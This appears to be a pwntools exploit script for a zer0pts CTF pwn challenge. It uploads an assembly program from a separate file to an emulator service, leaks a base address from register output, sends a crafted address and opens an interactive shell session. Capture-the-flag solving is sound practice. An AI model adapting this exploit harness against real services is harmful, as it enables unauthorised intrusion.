from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn.ctf.zer0pts.com"
    port = 9005
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)


with open('bins2.asm', 'rb') as f:
    prog = f.read()

def print_reg():
    s = recvline()
    v = just_u64(s)
    return v

recvuntil(b'end)')
sendline(prog)
sendline(b'EOF')
recvuntil(b'[+] Starting emulation\n')

wait_for_attach()
send(b"start")
print(recvline())

while True:
    s = recvline()
    print(s)
    if s == b"end":
        print(print_reg())
        break


# bin search
while True:
    s = recvline()
    print(s)
    if s == b"end":
        base = print_reg() << 12
        break

print("base: ", hex(base))
send(p64(base + 0x2000))
interactive()

print("finished")
x = print_reg()
print(hex(x))
print('interactive~~')


interactive()
